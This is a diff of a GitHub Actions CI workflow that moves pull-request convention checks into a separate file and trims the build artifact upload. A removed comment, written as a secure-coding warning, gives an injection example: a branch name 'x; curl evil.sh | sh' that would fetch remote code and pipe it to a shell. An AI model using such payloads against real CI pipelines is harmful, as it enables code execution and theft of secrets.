@@ -18,7 +18,8 @@
 #      identically here and inside .githooks/pre-push on a contributor's
 #      machine, so what is enforced locally is exactly what is enforced here.
 #   3. One workflow per concern — security.yml for credentials, db-check.yml for
-#      the schema, e2e.yml for browser tests — so each maps to exactly one
+#      the schema, e2e.yml for browser tests, pr-conventions.yml for the pull
+#      request's title, branch, commits and size — so each maps to exactly one
 #      required status check.
 #   4. Required checks are listed in docs/CI_CD.md and applied by
 #      .github/branch-protection/apply.sh.
@@ -227,107 +228,15 @@ jobs:
           shellcheck -S warning -x -f gcc "${scripts[@]}"
 
   # ---------------------------------------------------------------------------
-  # Job 2 — Pull-request discipline.
+  # Pull-request discipline ("PR Conventions") lives in pr-conventions.yml.
   #
-  # Only meaningful for pull requests: title conventions, branch naming,
-  # issue linkage, PR size, and linear history.
+  # It needs to re-run when a title, description or label changes, and this
+  # workflow must not: re-running lint, tests, the build and Lighthouse because
+  # somebody fixed a typo in a title would waste ten minutes of runner time.
   # ---------------------------------------------------------------------------
-  pr-conventions:
-    name: PR Conventions
-    runs-on: ubuntu-latest
-    # Deliberately NOT `needs: hygiene`. This job is cheap and reports on things
-    # a contributor can fix without touching the code (title, branch name, PR
-    # size), so it must still run — and still report a conclusion — when the
-    # hygiene job has already failed. Gating it on hygiene would leave it
-    # "skipped", and a skipped check tells a contributor nothing.
-    if: github.event_name == 'pull_request'
-    timeout-minutes: 15
-    steps:
-      # `actions/checkout` on a pull_request event checks out refs/pull/N/merge
-      # by default — a synthetic merge commit GitHub creates for the PR. That
-      # makes every linear-history check report a false merge commit, so the
-      # head SHA is checked out explicitly instead.
-      #
-      # `fetch-depth: 0` fetches the complete history of every branch, so
-      # `origin/$BASE_REF` is available without a second `git fetch` — which is
-      # what lets the checkout run with `persist-credentials: false`. No
-      # credential is left in .git/config for a later step (or an artifact) to
-      # pick up.
-      - name: Checkout the pull-request head
-        uses: actions/checkout@v5
-        with:
-          fetch-depth: 0
-          ref: ${{ github.event.pull_request.head.sha }}
-          persist-credentials: false
-
-      - name: Verify the base branch is available
-        env:
-          BASE_REF: ${{ github.base_ref }}
-        run: |
-          if ! git rev-parse --verify --quiet "origin/$BASE_REF" >/dev/null; then
-            echo "::error::The base branch 'origin/$BASE_REF' is not present in the clone, so the commit range cannot be computed. This is a bug in the workflow, not in the contribution."
-            exit 1
-          fi
-          echo "Base branch origin/$BASE_REF is available at $(git rev-parse --short "origin/$BASE_REF")."
-
-      # `github.head_ref` is attacker-controlled: a contributor can name a
-      # branch `x; curl evil.sh | sh` and GitHub will interpolate it into the
-      # script before the shell ever sees it. Always pass untrusted values
-      # through the environment and reference them as shell variables.
-      - name: Validate branch naming
-        env:
-          BASE_REF: ${{ github.base_ref }}
-          HEAD_REF: ${{ github.head_ref }}
-        run: bash scripts/checks/check-branch-name.sh "$HEAD_REF"
-
-      - name: Validate commit messages (Conventional Commits)
-        env:
-          BASE_REF: ${{ github.base_ref }}
-        run: |
-          bash scripts/checks/check-commit-msg.sh --range "origin/$BASE_REF...HEAD"
-
-      - name: Validate pull-request metadata
-        env:
-          PR_NUMBER: ${{ github.event.pull_request.number }}
-          PR_TITLE: ${{ github.event.pull_request.title }}
-          PR_BODY: ${{ github.event.pull_request.body }}
-          PR_HEAD_REF: ${{ github.head_ref }}
-          PR_BASE_REF: ${{ github.base_ref }}
-          PR_COMMITS: ${{ github.event.pull_request.commits }}
-          PR_ADDITIONS: ${{ github.event.pull_request.additions }}
-          PR_DELETIONS: ${{ github.event.pull_request.deletions }}
-          PR_CHANGED_FILES: ${{ github.event.pull_request.changed_files }}
-          PR_LABELS: ${{ join(github.event.pull_request.labels.*.name, ',') }}
-        run: bash scripts/checks/check-pr-meta.sh
-
-      - name: Semantic pull-request title (advisory annotations)
-        if: always()
-        uses: amannn/action-semantic-pull-request@v6
-        env:
-          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
-        with:
-          types: |
-            feat
-            fix
-            docs
-            style
-            refactor
-            perf
-            test
-            build
-            ci
-            chore
-            revert
-          requireScope: false
-          subjectPattern: '^[a-z].{1,71}$'
-          subjectPatternError: >
-            The PR title subject must start with a lowercase letter and be at
-            most 72 characters, because it becomes the squash-merge commit on
-            main.
-        continue-on-error: true
 
   # ---------------------------------------------------------------------------
-  # Job 3 — Verify: lint, types, formatting, tests, build.
+  # Job 2 — Verify: lint, types, formatting, tests, build.
   #
   # Activates automatically the moment package.json + pnpm-lock.yaml land.
   # Until then it succeeds with an explanatory notice so it can safely be a
@@ -443,17 +352,23 @@ jobs:
           fi
           echo "Client bundle is free of credential material."
 
+      # .next/cache is the webpack/SWC build cache. Lighthouse only needs the
+      # server output, and the cache grows to hundreds of megabytes as the app
+      # does — every one of which would be uploaded here and downloaded again
+      # by the next job.
       - name: Upload build output
         if: steps.detect.outputs.app == 'true'
         uses: actions/upload-artifact@v4
         with:
           name: next-build-output
-          path: .next/
+          path: |
+            .next/
+            !.next/cache/
           retention-days: 7
           if-no-files-found: ignore
 
   # ---------------------------------------------------------------------------
-  # Job 4 — Accessibility budget (Lighthouse CI).
+  # Job 3 — Accessibility budget (Lighthouse CI).
   #
   # Budgets come from docs/UI_UX_SPECIFICATION.md and the roadmap MVP gate:
   # performance >= 90, accessibility >= 95.
